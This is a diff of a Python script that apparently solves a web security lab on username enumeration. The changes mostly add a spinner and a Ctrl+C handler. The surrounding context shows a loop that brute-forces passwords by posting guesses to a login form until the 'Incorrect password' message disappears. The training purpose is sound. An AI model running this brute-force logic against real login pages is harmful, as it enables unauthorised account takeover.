@@ -1,14 +1,19 @@
 import requests
 import sys
-import os
 import getopt
+import signal
+from halo import Halo
 
 
-def clear_screen():
-  if os.name == 'posix':
-    os.system('clear')
-  else:
-    os.system('cls')
+# Handle Ctrl+c
+def signal_handler(signum, frame):
+  print("\nSaliendo...")
+  print("\x1b[?25h", end="") # Make cursor visible
+  sys.exit(0)
+
+
+# Call the function to handle Ctrl+c
+signal.signal(signal.SIGINT, signal_handler)
 
 
 def get_password(url, session):
@@ -27,8 +32,6 @@ def get_password(url, session):
       data = {'username': username, 'password':  password}
       number += 1
       response = session.post(url, data=data)
-      clear_screen()
-      print(f"[!] Testing password \"{password}\"")
 
       if "Incorrect password" not in response.text:
         valid_password = password
@@ -37,32 +40,40 @@ def get_password(url, session):
 
 
 def main(argv):
+  help_message = "This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login"
+
   try:
     opts, args = getopt.getopt(argv, "hu:")
   except getopt.GetoptError:
-    print("This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login")
-    print("\x1b[?25h")
+    print(help_message)
+    print("\x1b[?25h", end="") # Make cursor visible
     sys.exit(2)
 
   for opt, arg in opts:
     if opt == "-u":
       url = arg
     elif opt == "-h":
-      print("This is the script for:\n'Username enumeration via response timing'\n\nUsage: python3 auth-3.py -u <url>/login")
-      print("\x1b[?25h")
+      print(help_message)
+      print("\x1b[?25h", end="") # Make cursor visible
       sys.exit()
 
   session = requests.Session()
-  password = get_password(url, session)
-  clear_screen()
   
-  print(f"[*] The username is: \"carlos\"\n[*] The password is: \"{password}\"")
+  # Spinner animation
+  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
+  spinner.succeed(f"The username is: \"carlos\"")
+
+  # Create and start spinner animation
+  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
+  spinner.start()
+  # Get valid password
+  password = get_password(url, session)
+  # Finish spinner
+  spinner.succeed(f"The password is: \"{password}\"")
 
 
 if __name__ == "__main__":
-  # Hide Cursor
-  print("\x1b[?25l")
+  print("\x1b[?25l", end="") # Hide cursor
   main(sys.argv[1:])
-  # Make cursor visible
-  print("\x1b[?25h")
+  print("\x1b[?25h", end="") # Make cursor visible
   sys.exit()
